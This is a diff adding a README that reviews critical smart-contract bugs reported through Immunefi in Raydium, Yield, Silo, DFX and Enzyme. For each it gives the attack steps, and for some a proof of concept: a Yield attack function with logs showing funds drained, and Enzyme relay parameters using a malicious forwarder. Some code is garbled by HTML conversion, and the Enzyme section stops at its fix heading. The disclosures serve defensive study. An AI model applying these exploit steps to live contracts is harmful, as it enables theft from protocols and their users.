@@ -1,0 +1,1178 @@
+<h1>Immunefi Bug Fixes</h1>
+<p>This repository documents research on critical bug fixes identified on Immunefi in 2023-2024, highlighting how these vulnerabilities were exploited, their impact on projects, and the subsequent fixes implemented. The goal is to provide insights into common pitfalls, remediation strategies, and lessons learned from real-world bug bounty reports.</p>
+<h1>1. Raydium - Tick Manipulation</h1>
+<p>Reported by: @riproprip</p>
+<p>Protocol: Raydium</p>
+<p>Date: January 10, 2024</p>
+<p>Bounty: $505,000 in RAY tokens</p>
+<h3>TL;DR</h3>
+<p>The vulnerability in Raydium's <code>increase_liquidity</code> function allowed attackers to manipulate liquidity at arbitrary price points by exploiting the <code>tickarray_bitmap_extension</code>. The function failed to verify if the account used for this extension was correct, letting attackers misuse it to "flip" tick statuses and perform unauthorized liquidity operations. This manipulation could significantly impact the pool's integrity and lead to financial loss. The fix involved adding a validation step to ensure the correct <code>TickArrayBitmapExtension</code> account is used, preventing these unauthorized actions.</p>
+<h3>Vulnerability Analysis</h3>
+<p>Raydium is an AMM with an integrated central order book system. Users can provide liquidity, perform swaps on the exchange, and stake the RAY token for additional yield. A fundamental aspect of Raydium is the Concentrated Liquidity Market Maker (CLMM).</p>
+<p>The vulnerability was located within the <a href="Raydium/increase_liquidity.rs">increase_liquidity</a> file of the Raydium protocol. It conducts several critical operations, including pool status validation, token amount calculations based on user-provided maximums, fee updates, and the actual increase of liquidity in the position’s state.</p>
+<p>Ticks represent discrete price points in a CLMM. By defining a range with tick<em>lower and tick</em>upper, an LP specifies the boundaries within which their liquidity will be active.</p>
+<p>The flaw was specifically in the conditional handling of the <a href="https://github.com/tpiliposian/Immunefi_bugfixes/blob/bde6c3486e58d91fff972cbdb12b8c4d56f2327f/Raydium/increase_liquidity.rs#L291">tickarray<em>bitmap</em>extension</a>:</p>
+<p>```rust
+let use<em>tickarray</em>bitmap<em>extension = pool</em>state.is<em>overflow</em>default<em>tickarray</em>bitmap(vec![tick<em>lower, tick</em>upper]);</p>
+<p>[...]</p>
+<p>if use<em>tickarray</em>bitmap<em>extension {
+    Some(&amp;remaining</em>accounts[0])
+} else {
+    None
+}
+```</p>
+<p>The <code>tickarray_bitmap_extension</code> is crucial in managing the pool’s pricing at extreme boundaries (very high or low prices). It also acts as an extended index to manage a larger range of price ticks which helps track which ticks have been initialized (i.e., have non-zero liquidity) beyond the default capacity of the system. The conditional logic decides whether an account from <code>remaining_accounts</code> is needed for the operation. This account is presumably related to handling the tick array bitmap extension. This function is designed to increase liquidity in a specific position within a liquidity pool using the remaining_accounts vector.</p>
+<p><code>remaining_accounts</code> is a vector containing all accounts passed into the instruction but not declared in the Accounts struct. This is useful when you want your function to handle a variable amount of accounts, e.g. when initializing a game with a variable number of players.</p>
+<p>The vulnerability arises because the function fails to verify whether <code>remaining_accounts[0]</code> is the accurate <code>TickArrayBitmapExtension</code> account linked to the current state of the pool. This oversight permits an attacker to execute liquidity operations at arbitrary price boundaries as described in the vulnerability demonstration section below.</p>
+<h3>Steps of the Attack:</h3>
+<ul>
+<li>Create a Secondary Pool: The attacker sets up a secondary pool.</li>
+<li>Target a Tick: They open a position at a specific tick they want to exploit in the primary pool.</li>
+<li>Zero Out and Manipulate Liquidity: They reduce the liquidity at this tick to zero and then increase it in a way that incorrectly uses the tickarray_bitmap of the primary pool.</li>
+</ul>
+<p>This manipulation lets the attacker “flip” a tick’s status in the bitmap. Transactions that should have adjusted liquidity at certain prices bypass these checks, allowing unauthorized liquidity increases.</p>
+<p>To clarify the exploit process using a practical example, consider price points A, B, and C, with A &lt; B &lt; C and both A and B within the lower range of the <code>bitmap_array</code>.
+The steps to exploit the vulnerability are as follows:
+1. Identify a victim pool.
+2. Execute a swap to shift the price to just above point A (A+1).
+3. Create liquidity within the price range B to C.
+4. Perform a swap across B without crossing C, which adds liquidity to the pool state due to the manipulated <code>tickarray_bitmap</code>.
+5. Execute the described attack to switch the <code>tickarray_bitmap</code> status at B to DISABLED, allowing a swap at A+1 to skip over B without affecting liquidity.
+6. Repeat the attack to re-enable the <code>tickarray_bitmap</code> at B.
+7. Perform another swap over B without crossing C, effectively doubling the liquidity erroneously.
+8. This process can be repeated as many times as desired to amass an excessive amount of liquidity.
+9. Following this procedure, swaps directed towards C will yield disproportionately high amounts of Token A, indicating the vulnerability has been fully exploited.
+10. If the goal is to acquire Token B, the process can be replicated at the higher end of the price spectrum.
+The core issue is the ability to “flip” a tick’s status within the tickarray_bitmap, allowing liquidity to be added without proper checks. This leads to significant discrepancies in liquidity management and compromises the integrity of the liquidity pool.</p>
+<h3>Vulnerability Fix</h3>
+<p>The correction involved adding a security check to ensure the correct application of the <code>tickarray_bitmap_extension</code>:</p>
+<p><code>rust
+if use_tickarray_bitmap_extension {
+    require_keys_eq!(
+        remaining_accounts[0].key(),
+        TickArrayBitmapExtension::key(pool_state_loader.key())
+    );
+    Some(&amp;remaining_accounts[0])
+} else {
+    None
+}
+</code></p>
+<p>This <a href="https://github.com/raydium-io/raydium-clmm/commit/83b5a471f2323fcac3848addab725b95e09ddeb8?source=post_page-----c6aae4527ed6--------------------------------">fix</a> introduces a validation step to confirm that the <code>remaining_accounts[0]</code> is the correct <code>TickArrayBitmapExtension</code> account associated with the pool’s current state.
+This ensures the proper handling of liquidity operations involving extreme price boundaries, thereby preventing the exploitation of this vulnerability in the future.</p>
+<h1>2. Yield Protocol - Logic Error</h1>
+<p>Reported by: @Paludo0x</p>
+<p>Protocol: Yield</p>
+<p>Date: April 28th, 2023</p>
+<p>Bounty: $95,000 USDC</p>
+<h3>TL;DR</h3>
+<p>The vulnerability in the Yield Protocol's strategy contract arises from the <code>burn()</code> function, which calculates the LP tokens to return to the user based on the current balance of LP tokens in the contract (<code>pool.balanceOf(address(this))</code>). An attacker can inflate this balance by sending extra LP tokens to the contract before calling burn, allowing them to withdraw more tokens than they originally deposited, effectively stealing from the protocol.</p>
+<h3>Vulnerability Analysis</h3>
+<p>Yield Protocol is a DeFi protocol that enables fixed-rate, fixed-term loan options between borrowers and lenders.</p>
+<p>The protocol facilitates these transactions via <code>fyTokens</code> (fixed yield tokens), a type of <code>ERC-20</code> token that can be exchanged one-to-one for an underlying asset upon reaching a predetermined maturity date.</p>
+<p>The vulnerability is associated with the <a href="https://arbiscan.io/address/0x5aeB4EFaAA0d27bd606D618BD74Fe883062eAfd0#code">strategy contract</a> of the protocol, which enables liquidity providers to deposit combined liquidity to a <code>YieldSpace</code> Pool.</p>
+<p>By depositing funds into the strategy contract, liquidity providers can mint strategy tokens. The amount of strategy tokens they receive corresponds proportionately to their deposit amount, allowing them to burn and redeem the LP tokens as well as any gain in fees/interest later.</p>
+<p>This vulnerability is associated with the burning shares functionality <code>burn(address to)</code> of the strategy contract which is responsible for burning the strategy tokens and allowing the user to withdraw the LP tokens:</p>
+<p>```solidity
+    function burn(address to)
+        external
+        isState(State.INVESTED)
+        returns (uint256 poolTokensObtained)
+    {
+        // Caching
+        IPool pool_ = pool;
+        uint256 poolCached_ = poolCached;
+        uint256 totalSupply_ = _totalSupply;</p>
+<pre><code>    // Burn strategy tokens
+    uint256 burnt = _balanceOf[address(this)];
+    _burn(address(this), burnt);
+
+    poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
+    pool_.safeTransfer(address(to), poolTokensObtained);
+
+    // Update pool cache
+    poolCached = poolCached_ - poolTokensObtained;
+}
+</code></pre>
+<p>```</p>
+<p>Initially, the contract’s strategy tokens are burned. Then, the amount of liquidity pool tokens to be acquired are calculated based on the LP tokens contained in the strategy contract and are transferred to the designated address.</p>
+<p>The pool tokens to be returned to the caller are calculated by:</p>
+<p><code>solidity
+poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
+</code></p>
+<p>This calculation is based on the LP tokens balance of the current strategy contract which could be inflated by sending the pool tokens directly to it.</p>
+<p>The attacker has control over <code>pool.balanceOf(address(this))</code>, which allows them to inflate the pool tokens returned, by transferring a specific amount of pool tokens directly to the strategy contract before burning the strategy shares tokens.</p>
+<p>As the pool tokens remain within the Strategy contract, the attacker making the call can mint the share tokens and then burn them back to retrieve the pool tokens that were utilized to inflate the calculation.</p>
+<p>This is done by the call to <code>mint()</code> function to get the strategy share tokens then the call to <code>burn()</code> function again to get back the LP tokens that were transferred.</p>
+<h3>PoC:</h3>
+<ul>
+<li>Clone the Immunefi bugfix review repository: <code>git clone https://github.com/immunefi-team/bugfix-reviews-pocs.git</code></li>
+<li>Run <code>forge test -vvv --match-path ./test/YieldProtocol/AttackTest.t.sol</code></li>
+</ul>
+<p>Attack function:</p>
+<p>```solidity
+    function _executeAttack() internal {
+        console.log("\n&gt;&gt;&gt; Execute attack\n");</p>
+<pre><code>    //burning of strategy tokens
+    uint256 tokensBurnt = strategyYSDAI6MMS.burn(ada);
+
+    //burning remaing part of LP tokens sent to strategy
+    strategyYSDAI6MMS.mint(address(strategyYSDAI6MMS));
+    strategyYSDAI6MMS.burn(ada);
+
+    //retrieving and converting all tokens to base token
+    FYDAI2309LPArbitrum.transfer(address(FYDAI2309LPArbitrum), FYDAI2309LPArbitrum.balanceOf(ada));
+    FYDAI2309LPArbitrum.burnForBase(ada,0,type(uint128).max); // get fyToken to the ADA
+    FYDAI2309LPArbitrum.retrieveBase(ada); // get DAI stored on the contract to the ADA
+    FYDAI2309LPArbitrum.retrieveFYToken(ada);  // get fyToken stoeed on the contract to the ADA.
+
+    console.log("Tokens Burnt : ",tokensBurnt);
+
+    _completeAttack();
+
+}
+</code></pre>
+<p>```</p>
+<p>Log output:</p>
+<p>```
+Ran 1 test for test/YieldProtocol/AttackTest.t.sol:AttackTest
+[PASS] testAttack() (gas: 677227)
+Logs:</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>Initiate attack</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>Tokens Obtained :  20916988492243432153263</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>Execute attack</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>Tokens Burnt :  32081082781615545896437</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>Attack complete</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>holder gain in base wei :  11096784340278200659569
+  pool gain in base wei :  -11096784340278200659569
+  Strategy gain in base wei :  0
+  holder gain in FYToken :  0
+  pool gain in FYToken :  0
+  Strategy gain in FYToken :  0
+  holder gain in LPToken :  0
+  pool gain in LPToken :  0
+  Strategy gain in LPToken :  -11164094289372113743173
+  Pool base token amount before transactions: 1.3330628639753853259506e22
+  Pool base token amount after transactions: 2.233844299475652599937e21
+  holder base token amount before transactions: 1e24
+  holder base token amount after transactions: 1.011096784340278200659569e24</p>
+<p>Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.61s (6.15s CPU time)
+```</p>
+<h3>Vulnerability Fix</h3>
+<p>In the patch, the project team modified the <code>burn()</code> function in the strategy contract to use <code>poolCached_</code> instead of <code>pool.balanceOf(address(this))</code> to determine the number of LP tokens that should be transferred to the caller, fixing the issue.</p>
+<p>The new formula would be:</p>
+<p><code>solidity
+poolTokensObtained = poolCached_ * burnt / totalSupply_;
+</code></p>
+<h1>3. Silo Finance - Logic Error</h1>
+<p>Reported by: @kankodu</p>
+<p>Protocol: Silo Finance</p>
+<p>Date: April 28th, 2023</p>
+<p>Bounty: $100,000 USDC</p>
+<h3>TL;DR</h3>
+<p>A vulnerability in the Base Silo contract of Silo Finance allowed attackers to manipulate the utilization rate and interest calculations by donating assets to markets with zero initial deposits. By becoming the majority shareholder and manipulating the utilization rate, attackers could inflate interest rates and borrow disproportionately high amounts of funds. The temporary fix involved depositing assets to prevent zero deposits, and the permanent fix capped utilization rates at 100% and limited maximum interest rates. Formal verification by Certora confirmed these fixes were effective against similar exploits.</p>
+<h3>Vulnerability Analysis</h3>
+<p>The whitehat reported the vulnerability in the <a href="https://github.com/silo-finance/silo-core-v1/blob/master/contracts/BaseSilo.sol">Base</a> Silo contract which is responsible for handling the core logic of the lending protocol. The Silo contract is a lending protocol which allows users to deposit collateral asset tokens to the contract by calling the <code>deposit()</code> function of the contract. In return, the contract mints the share of tokens to the depositor based on the deposited amount and the total supply of the share and updates the storage state <code>_assetStorage[_asset]</code> with the deposited amount:</p>
+<p>```solidity
+       AssetStorage storage <em>state = _assetStorage[</em>asset];</p>
+<pre><code>   collateralAmount = _amount;
+
+
+   uint256 totalDepositsCached = _collateralOnly ? _state.collateralOnlyDeposits : _state.totalDeposits;
+
+
+   if (_collateralOnly) {
+       collateralShare = _amount.toShare(totalDepositsCached, _state.collateralOnlyToken.totalSupply());
+       _state.collateralOnlyDeposits = totalDepositsCached + _amount;
+       _state.collateralOnlyToken.mint(_depositor, collateralShare);
+   } else {
+       collateralShare = _amount.toShare(totalDepositsCached, _state.collateralToken.totalSupply());
+       _state.totalDeposits = totalDepositsCached + _amount;
+       _state.collateralToken.mint(_depositor, collateralShare);
+   }
+</code></pre>
+<p>``<code>
+The users who deposit the collateral in the contract can borrow other assets from the protocol by using the</code>borrow()` function, which updates the accrued interest rate of the borrowing asset first and then checks to see if the current contract has enough tokens for the user to borrow. Then, the function transfers the tokens to the user and checks the loan-to-value (LTV) ratio based on the collateral provided.</p>
+<p>```solidity
+   function <em>borrow(address _asset, address _borrower, address _receiver, uint256 _amount)
+       internal
+       nonReentrant
+       returns (uint256 debtAmount, uint256 debtShare)
+   {
+       // MUST BE CALLED AS FIRST METHOD!
+       _accrueInterest(</em>asset);</p>
+<pre><code>   if (!borrowPossible(_asset, _borrower)) revert BorrowNotPossible();
+
+
+   if (liquidity(_asset) &lt; _amount) revert NotEnoughLiquidity();
+</code></pre>
+<p>/// @inheritdoc IBaseSilo
+   function liquidity(address <em>asset) public view returns (uint256) {
+       return ERC20(</em>asset).balanceOf(address(this)) - <em>assetStorage[</em>asset].collateralOnlyDeposits;
+   }
+```</p>
+<p>On a high level, the vulnerability allows an attacker to manipulate the utilization rate of an asset that had zero total deposit to the contract. An attacker can manipulate the utilization rate by donating an ERC20 asset to the contract, and if the attacker had the majority of the shares in the market for that particular asset, borrowing the donated token would inflate the utilization rate of that particular asset. In general, the steps to reproduce this attack:</p>
+<ol>
+<li>Determine a market that had 0 total deposits for one of the assets in the market. For example, WETH had 0 total deposits.</li>
+<li>Become the majority shareholder for that particular asset by depositing WETH to that market, which will make the <code>totalDeposits</code> for that asset non-zero.</li>
+<li>Donate additional WETH to the market, which will allow other users to borrow more WETH than the total deposited WETH, on step 2.</li>
+<li>Use another user/address to deposit another asset in the market, to borrow the donated WETH.</li>
+<li>In the next block, if <code>accrueInterest()</code> is called, the utilization rate of the attacker's initial deposited amount will be over 100%, which will increase the interest rate to an extremely high value.</li>
+<li>Because of this inflated interest rate, the attacker’s initial deposit is valued more than it should be, and it allows the attacker to borrow most of the funds in the market.</li>
+</ol>
+<p><code>solidity
+   /// @inheritdoc IBaseSilo
+   function liquidity(address _asset) public view returns (uint256) {
+       return ERC20(_asset).balanceOf(address(this)) - _assetStorage[_asset].collateralOnlyDeposits;
+   }
+</code></p>
+<h3>PoC</h3>
+<p>The steps to use this POC is as follows:</p>
+<ol>
+<li>Install https://github.com/foundry-rs/foundry</li>
+<li>Replace <code>Counter.sol</code> with <a href="SiloFinance/BugFixReview.sol">BugFixReview.sol</a></li>
+<li>Replace <code>Counter.t.sol</code> with <a href="SiloFinance/BugFixReview.t.sol">BugFixReview.t.sol</a></li>
+<li>Run <code>forge test — match-path test/BugFixReview.t.sol -vvv</code></li>
+</ol>
+<p>This POC will make a local fork on 17139470 and 17139471 and will try to manipulate the interest rate on the first block before stealing funds on the second block. Since the attack occurs over two blocks, we can’t use a flashloan to demonstrate the attack.</p>
+<p>What we can do instead is to use deal from Forge to manipulate the attacker contract balance.</p>
+<h3>Vulnerability Fix</h3>
+<p>The project temporarily fixed the vulnerable market after the report was submitted, and after the proper fix is ready, the code is deployed to the mainnet.</p>
+<p>The first mitigation that the project implemented was to deposit an asset to the market that had 0 total deposits in the market, which can be seen in this transaction.</p>
+<p>However, this deposit only mitigated the vulnerable market temporarily. For the permanent fix, the project implemented a cap in the utilization rate calculation and limited the maximum compounded interest rate to 10k % APR. The former one is to make sure that the utilization rate never exceeds 100% of utilization rate. And the latter is to stop producing yield after compounded interest passes 10%, unless <code>accrueInterest()</code> is being called.</p>
+<p>To make sure the fixes that the project implemented are secure and didn’t leave any edge cases, the code went through formal verification from Certora, with added rules that cover this vulnerability. Those rules are:</p>
+<p><code>cantExceedMaxUtilization</code> and <code>interestNotMoreThenMax</code>.</p>
+<ul>
+<li><code>cantExceedMaxUtilization</code> is an invariant that guarantees that the utilization rate never exceeds 100%. This means that no one can borrow more than the deposited amount.</li>
+<li><code>interestNotMoreThenMax</code> tests the fixes to make sure that the interest rate cannot exceed the max limit.</li>
+</ul>
+<p>The details for both of these rules/specs were already published by the project, which you can access in their <a href="https://github.com/silo-finance/silo-core-v1/blob/e5d16f201ab2139829d45ed881532c936249d3a5/certora/specs/interest-rate-model/CertoraInterestRate.spec#L4-L46">Github</a>.</p>
+<p>The permanent fix can be seen at <a href="https://etherscan.io/address/0x76074C0b66A480F7bc6AbDaA9643a7dc99e18314#code">this address</a>.</p>
+<p>For further information regarding the fixes that Silo Finance and Certora made to fix this vulnerability, you can read <a href="https://medium.com/silo-protocol/vulnerability-disclosure-2023-06-06-c1dfd4c4dbb8">here</a> and <a href="https://medium.com/certora/silo-finance-post-mortem-3b690fffeb08">here</a>.</p>
+<h1>4. DFX Finance - Rounding Error</h1>
+<p>Reported by: @perseverance</p>
+<p>Protocol: DFX Finance</p>
+<p>Date: April 28, 2023</p>
+<p>Bounty: $100,000 USDT</p>
+<h3>TL;DR</h3>
+<p>A vulnerability in DFX Finance’s AssimilatorV2 contract allowed users to exploit the token transfer calculation when using EURS tokens, which have fewer decimals than most tokens. By repeatedly depositing small amounts that resulted in zero tokens being transferred, attackers could still receive minted curve tokens representing pool shares. This allowed attackers to progressively take over the pool without providing corresponding liquidity. DFX Finance fixed the issue by requiring that the transferred amount is greater than zero before allowing the transaction.</p>
+<h3>Vulnerability Analysis</h3>
+<p>DFX Finance is a decentralized foreign exchange (FX) protocol. DFX Finance creates a decentralized marketplace where users can swap non-USD stablecoins pegged to various foreign currencies, such as CADC, EUROC, XSGD, and more. These types of exchanges also typically incentivize liquidity providers to supply capital by offering yield on funds deposited. The design uses an automated market making mechanism (AMM) to allow the exchange to operate in a decentralized way. The AMM exchanges tokens according to a <a href="https://yos.io/2018/11/10/bonding-curves/">bonding curve</a>, which is dynamically adjusted according to real world price feeds from Chainlink. Each currency is paired with USDC, which is treated as a bridge currency in the DFX AMM between all other stablecoins.</p>
+<p>Assimilators are necessary when dealing with pairs of different values, which is core to DFX protocol as all assets are paired with USDC. The <a href="https://github.com/dfx-finance/protocol-v2/blob/main/src/assimilators/AssimilatorV2.sol">AssimilatorV2</a> contract is responsible for converting all amounts to a numeraire, or a base value used for computations across the protocol. DFX Finance maintains the assimilators which integrate with Curve to provide proportional liquidity to pools. When users would like to provide liquidity to a pool to receive yield on their stablecoins, they call the deposit function on the <a href="DFXFinance/Curve.sol">Curve pool</a> and receive liquidity provider tokens in return representing their proportion of the underlying asset they deposited.</p>
+<p>When a user deposits EURS, the function checks if the deposit amount is greater than zero, and then delegates most of the logic to the library call <code>ProportionalLiquidity.proportionalDeposit</code>.</p>
+<p>Within the <code>proportionalDeposit()</code> function, the curve pool calls to the <code>AssimilatorV2</code> contract <code>intakeNumeraireLPRatio</code> to calculate the corresponding amount of euros to transfer from the user, which is calculated on line 145, based on the LP ratio passed to the function:</p>
+<p>```solidity
+// takes a numeraire amount, calculates the raw amount of eurs, transfers it in and returns the corresponding raw amount
+function intakeNumeraireLPRatio(
+    uint256 <em>baseWeight,
+    uint256 _minBaseAmount,
+    uint256 _maxBaseAmount,
+    uint256 _quoteWeight,
+    uint256 _minQuoteAmount,
+    uint256 _maxQuoteAmount,
+    address _addr,
+    int128 _amount
+) external override returns (uint256 amount</em>) {
+    uint256 <em>tokenBal = token.balanceOf(</em>addr);</p>
+<pre><code>if (_tokenBal &lt;= 0) return 0;
+
+_tokenBal = _tokenBal.mul(1e18).div(_baseWeight);
+
+uint256 _usdcBal = usdc.balanceOf(_addr).mul(1e18).div(_quoteWeight);
+
+// Rate is in 1e6
+uint256 _rate = _usdcBal.mul(10**tokenDecimals).div(_tokenBal);
+
+amount_ = (_amount.mulu(10**tokenDecimals) * 1e6) / _rate;
+
+if (address(token) == address(usdc)) {
+    require(amount_ &gt;= _minQuoteAmount &amp;&amp; amount_ &lt;= _maxQuoteAmount, "Assimilator/LP Ratio imbalanced!");
+} else {
+    require(amount_ &gt;= _minBaseAmount &amp;&amp; amount_ &lt;= _maxBaseAmount, "Assimilator/LP Ratio imbalanced!");
+}
+token.safeTransferFrom(msg.sender, address(this), amount_);
+</code></pre>
+<p>}
+```</p>
+<p>After the transfer of the deposit is handled in the <code>intakeNumeraireLPRatio()</code> function and liquidity is transferred from the user to the contract, the <code>proportionalDeposit()</code> function mints the number of LP tokens which represents the users’ share of the pool. Finally, the deposit function returns the value of deposits and shares minted:</p>
+<p>```solidity
+function proportionalDeposit(...)
+    external
+    returns (uint256 curves<em>, uint256[] memory)
+{
+    ...
+    require(</em>newShells &gt; 0, "Proportional Liquidity/can't mint negative amount");
+    mint(curve, msg.sender, curves_ = _newShells.mulu(1e18));</p>
+<pre><code>return (curves_, deposits_);
+</code></pre>
+<p>}
+```</p>
+<p>DFX Finance’s contracts contained a vulnerability that stemmed from the calculation of the transfer amount within the <code>AssimilatorV2</code> contract on <a href="https://github.com/dfx-finance/protocol-v2/blob/main/src/assimilators/AssimilatorV2.sol#L145">line 145</a>. The issue arises when the <code>_rate</code> exceeds the numerator value, resulting in an integer division that leads to zero tokens being transferred from the user. Despite transferring zero tokens, the user still receives curve tokens which represent their portion of the curve pool. To exploit this, an attacker would deposit a minuscule amount of tokens, causing the transferred amount to be zero while still receiving minted curve tokens in exchange for the small proportion of tokens “deposited”:</p>
+<p><code>solidity
+// Rate is in 1e6
+uint256 _rate = _usdcBal.mul(10**tokenDecimals).div(_tokenBal);
+</code>
+Typically, tokens have at least six decimals, which limits the potential profit to an amount lower than would be spent on gas for the transaction. However, the EURS token on the Polygon network has only two decimals. By utilizing the EURS token and repeatedly depositing a small amount (around 10,000 times) within a single transaction, an attacker can generate a profit of approximately 172 EURO or 190 USDC per attack by withdrawing the minted curve tokens. At the time of submission, the vulnerable pool had a balance of $237,143 USD, which could have been stolen by an attacker progressively acquiring a larger portion of the pool through successive attacks.</p>
+<h3>PoC</h3>
+<p>The Immunefi team prepared the following <a href="DFXFinance/PoC.sol">PoC</a> to demonstrate the vulnerability.</p>
+<h3>Vulnerability Fix</h3>
+<p>DFX Finance fixed the issue by deploying a new version of the <a href="https://polygonscan.com/address/0xeC1d45DD89f8Efe9dCeDF1141D8ab992fa3Dc9a1#code">AssimilatorV2</a> contract and added a <code>require</code> statement which checks the amount to be transferred from the user is greater than zero. The existing Curve pool was migrated to using the new Assimilator.</p>
+<p>```solidity
+// takes a numeraire amount, calculates the raw amount of eurs, transfers it in and returns the corresponding raw amount
+function intakeNumeraire(int128 <em>amount)
+    external
+    override
+    returns (uint256 amount</em>)
+{
+    uint256 _rate = getRate();</p>
+<pre><code>amount_ = (_amount.mulu(10**tokenDecimals) * 10**oracleDecimals) / _rate;
+
+require(amount_ &gt; 0, "intakeNumeraire/zero-amount!");
+token.safeTransferFrom(msg.sender, address(this), amount_);
+</code></pre>
+<p>}
+```</p>
+<h1>5. Enzyme Finance - Missing Privilege Check</h1>
+<p>Reported by: @rootrescue</p>
+<p>Protocol: Enzyme Finance</p>
+<p>Date: Mar 28, 2023</p>
+<p>Bounty: $400,000</p>
+<h3>TL;DR</h3>
+<p>Enzyme Finance's use of the Gas Station Network had a vulnerability in their <code>preRelayedCall()</code> function due to missing validation of the forwarder address. Attackers could exploit this by using a malicious forwarder to relay transactions and manipulate fees, allowing them to drain funds from the paymaster. The fix added a check to ensure only trusted forwarders are used, preventing unauthorized fee manipulation and protecting the system from exploitation.</p>
+<h3>Vulnerability Analysis</h3>
+<p>Enzyme Finance is a decentralized asset management platform built on Ethereum. It enables anyone to create, manage, and invest in custom investment strategies using a variety of different assets, including cryptocurrencies and other digital assets.</p>
+<p>Enzyme makes use of the Gas Station Network (GSN) to allow gasless clients to interact with Ethereum smart contracts without users needing ETH for transaction fees.</p>
+<h3>GSN</h3>
+<p>The GSN is a decentralized network of relayers that allows dApps to pay the costs of transactions instead of individual users. This can lower the barrier of entry for users and increase user experience by allowing users to make gasless transactions. </p>
+<p>The GSN makes use of <code>meta-transactions</code>. <code>Meta-transactions</code> are a design pattern in which users sign messages containing information about a transaction they would like to execute, but relayers are responsible for signing the Ethereum transaction, sending it to the network, and paying the gas cost.</p>
+<p>The flow of meta-transactions is as follows:</p>
+<ol>
+<li>The user sends a signed message to the relay server containing transaction details.</li>
+<li>The relay server verifies the transaction and ensures that there are sufficient fees to cover the costs.</li>
+<li>The relay server generates a new transaction that uses the user’s signed message, trusted forwarder’s address, and paymaster’s address to call the relay hub.</li>
+<li>The relay server signs the new transaction and sends it to the Ethereum network, paying the necessary gas fees in advance.</li>
+<li>After receiving the transaction, the relay hub calls the trusted forwarder contract with the user’s signed message and then calls the recipient contract.</li>
+<li>The trusted forwarder validates the user’s signature, recovers the user’s address, and transmits the transaction to the recipient contract.</li>
+<li>The transaction is executed and the blockchain state is updated by the recipient contract.</li>
+<li>Following the completion of the transaction, the relay hub requests reimbursement from the paymaster contract for the relay server’s gas fees.</li>
+<li>The paymaster contract validates the transaction and sends funds (in tokens or ETH) to the relay server to cover the gas fees and any additional service fees.</li>
+</ol>
+<p>Enzyme has a set of contracts that support the use of the GSN. This consists of <code>GasRelayPaymasterLib</code>, <code>GasRelayPaymasterFactory</code>, and <code>GasRelayRecipientMixin</code>. The <code>GasRelayPaymasterFactory</code> helps create instances of paymasters, and the <code>GasRelayRecipientMixin</code> has shared logic that is inherited for <code>relayable</code> transactions. The <code>GasRelayPaymasterLib</code> is responsible for providing the logic for paymasters, and importantly, the rules for calls that can be relayed. The paymaster is intended to validate that the forwarder is approved by the paymaster as well as by the recipient contract in <code>preRelayedCall()</code> function:</p>
+<p><code>solidity
+    function preRelayedCall(
+        GsnTypes.RelayRequest calldata relayRequest,
+        bytes calldata signature,
+        bytes calldata approvalData,
+        uint256 maxPossibleGas
+    )
+    external
+    override
+    returns (bytes memory, bool) {
+        _verifyRelayHubOnly();
+        _verifyForwarder(relayRequest);
+        _verifyValue(relayRequest);
+        _verifyPaymasterData(relayRequest);
+        _verifyApprovalData(approvalData);
+        return _preRelayedCall(relayRequest, signature, approvalData, maxPossibleGas);
+    }
+</code></p>
+<p>However, within Enzyme’s <code>GasRelayPaymasterLib</code> contract, the external function which contained the check for a valid forwarder was overridden:</p>
+<p>``<code>solidity
+    /// @notice Checks whether the paymaster will pay for a given relayed tx
+    /// @param _relayRequest The full relay request structure
+    /// @return context_ The tx signer and the fn sig, encoded so that it can be passed to</code>postRelayCall`
+    /// @return rejectOnRecipientRevert_ Always false
+    function preRelayedCall(
+        IGsnTypes.RelayRequest calldata <em>relayRequest,
+        bytes calldata,
+        bytes calldata,
+        uint256
+    )
+        external
+        override
+        relayHubOnly
+        returns (bytes memory context</em>, bool rejectOnRecipientRevert<em>)
+    {
+        address vaultProxy = getParentVault();
+        require(
+            IVault(vaultProxy).canRelayCalls(</em>relayRequest.request.from),
+            "preRelayedCall: Unauthorized caller"
+        );</p>
+<pre><code>    bytes4 selector = __parseTxDataFunctionSelector(_relayRequest.request.data);
+    require(
+        __isAllowedCall(
+            vaultProxy,
+            _relayRequest.request.to,
+            selector,
+            _relayRequest.request.data
+        ),
+        "preRelayedCall: Function call not permitted"
+    );
+
+    return (abi.encode(_relayRequest.request.from, selector), false);
+}
+</code></pre>
+<p>```</p>
+<p>When a relayed transaction is sent via GSN in a typical flow, the trusted forwarder is being relied on to perform an important security check, verifying the user’s signature when a transaction is relayed. Since a malicious trusted forwarder can be provided due to missing verification of the provided forwarder’s address in the paymaster, the signature verification can be bypassed, and a relay call can be crafted in such a way that the paymaster returns much more fees than expected since the <code>from</code> address is believed to be the address which matches the signature provided. An attacker would craft the following parameters of <code>relayCall</code> to exploit the missing validation after deploying a malicious forwarder:</p>
+<p>```js
+const relayRequest = {
+      from: VaultOwnerAddr, // Address to emulate (signature not verified)
+      to: ComptrollerProxyAddr, // Bypass checks in preRelayedCall()
+      value: 0,
+      gas: ...,
+      nonce: ...,
+      data: '0x39bf70d1', // 0x39bf70d1 == callOnExtension()
+      validUntil: ...,
+};</p>
+<p>const relayData = {
+      gasPrice: ...,
+      pctRelayFee: 1000, // 1000% fee to be returned to relay worker
+      baseRelayFee: 0, // Base fee can be used to manipulate returned funds
+      relayWorker: RelayWorkerAddr, // Attacker relay worker
+      paymaster: PaymasterAddr, // Enzyme controlled paymaster
+      forwarder: ExploitForwarder.address, // Attacker malicious forwarder
+      paymasterData: true, // top up the paymaster if not enough funds
+      clientId: ...,
+};</p>
+<p>let tx = await RelayHub.connect(impersonatedSigner)
+      .relayCall(defaultMaxAcceptance,
+            {
+                   request: relayRequest,
+                   relayData: relayData
+            },
+            requestSignature,
+            approvalData,
+            externalGasLimit,
+      );
+```</p>
+<p>The most relevant changes to the relay data are the <code>forwarder</code>, which is set to the malicious forwarder deployed by the attacker, and the <code>pctRelayFee</code> and <code>baseRelayFee</code> which can be used to manipulate the amount of funds returned to the relayWorker by the paymaster.</p>
+<h3>Vulnerability Fix</h3>
